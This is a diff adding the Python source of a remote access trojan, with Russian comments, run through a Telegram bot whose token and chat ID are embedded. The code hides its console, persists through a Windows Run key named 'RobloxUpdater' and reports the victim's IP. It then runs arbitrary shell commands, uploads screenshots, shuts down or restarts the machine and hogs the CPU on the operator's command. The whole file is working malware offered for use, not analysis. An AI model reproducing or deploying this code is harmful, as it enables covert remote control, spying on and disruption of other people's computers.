@@ -1,0 +1,125 @@
+import os
+import time
+import requests
+import subprocess
+import platform
+import sys
+
+# --- НАСТРОЙКИ ---
+TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
+CHAT_ID = "7352598189"
+
+# --- ОТПРАВКА В TELEGRAM ---
+def send_tg(msg):
+    try:
+        requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+            json={"chat_id": CHAT_ID, "text": msg}
+        )
+    except:
+        pass
+
+# --- АВТОЗАГРУЗКА ---
+def add_to_startup():
+    try:
+        if platform.system() != "Windows":
+            return
+        import winreg
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+        exe_path = sys.executable if not getattr(sys, 'frozen', False) else sys.argv[0]
+        winreg.SetValueEx(key, "RobloxUpdater", 0, winreg.REG_SZ, f'"{exe_path}"')
+        winreg.CloseKey(key)
+        send_tg("✅ RAT добавлен в автозагрузку!")
+    except Exception as e:
+        send_tg(f"⚠️ Ошибка автозагрузки: {e}")
+
+# --- ВЫПОЛНЕНИЕ КОМАНД ---
+def execute_cmd(cmd):
+    try:
+        r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        return r.stdout + r.stderr
+    except:
+        return "Ошибка"
+
+def screenshot():
+    try:
+        import pyautogui
+        path = "screen.png"
+        pyautogui.screenshot().save(path)
+        return path
+    except:
+        return None
+
+def freeze_system(duration_minutes=5):
+    """Запускает нагрузку на CPU на указанное количество минут"""
+    try:
+        # PowerShell скрипт: бесконечный цикл на duration_minutes минут
+        ps_script = f'''
+$stop = (Get-Date).AddMinutes({duration_minutes})
+while ((Get-Date) -lt $stop) {{ $i = 0 }}
+'''
+        # Запускаем скрыто
+        subprocess.Popen(
+            ['powershell', '-Command', ps_script],
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            shell=True
+        )
+        send_tg(f"⏳ Нагрузка на процессор запущена на {duration_minutes} минут!")
+    except Exception as e:
+        send_tg(f"❌ Ошибка запуска нагрузки: {e}")
+
+# --- ОБРАБОТКА КОМАНД ---
+def handle_commands():
+    while True:
+        try:
+            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
+            updates = requests.get(url).json()
+            if updates['result']:
+                last = updates['result'][-1]
+                msg = last['message']['text']
+                chat = last['message']['chat']['id']
+                if str(chat) == CHAT_ID:
+                    if msg.startswith('/cmd'):
+                        out = execute_cmd(msg[5:])
+                        send_tg(f"💻 Результат:\n{out[:4000]}")
+                    elif msg == '/screen':
+                        img = screenshot()
+                        if img:
+                            with open(img, "rb") as f:
+                                requests.post(
+                                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
+                                    data={"chat_id": CHAT_ID},
+                                    files={"photo": f}
+                                )
+                            os.remove(img)
+                        else:
+                            send_tg("❌ Ошибка скриншота")
+                    elif msg == '/shutdown':
+                        subprocess.run("shutdown /s /t 5", shell=True)
+                        send_tg("💻 ПК выключается через 5 секунд!")
+                    elif msg == '/restart':
+                        subprocess.run("shutdown /r /t 5", shell=True)
+                        send_tg("💻 ПК перезагрузится через 5 секунд!")
+                    elif msg == '/altf4':
+                        import pyautogui
+                        pyautogui.hotkey('alt', 'f4')
+                        send_tg("⌨️ Alt+F4 отправлен!")
+                    elif msg == '/freeze':
+                        freeze_system(5)  # 5 минут нагрузки
+            time.sleep(5)
+        except:
+            time.sleep(5)
+
+# --- ГЛАВНАЯ ---
+def main():
+    add_to_startup()
+    ip = requests.get("https://api.ipify.org").text
+    send_tg(f"🖥️ RAT запущен (скрыто)!\nIP: {ip}\nСистема: {platform.system()} {platform.release()}")
+    handle_commands()
+
+if __name__ == "__main__":
+    if getattr(sys, 'frozen', False):
+        import ctypes
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    main()
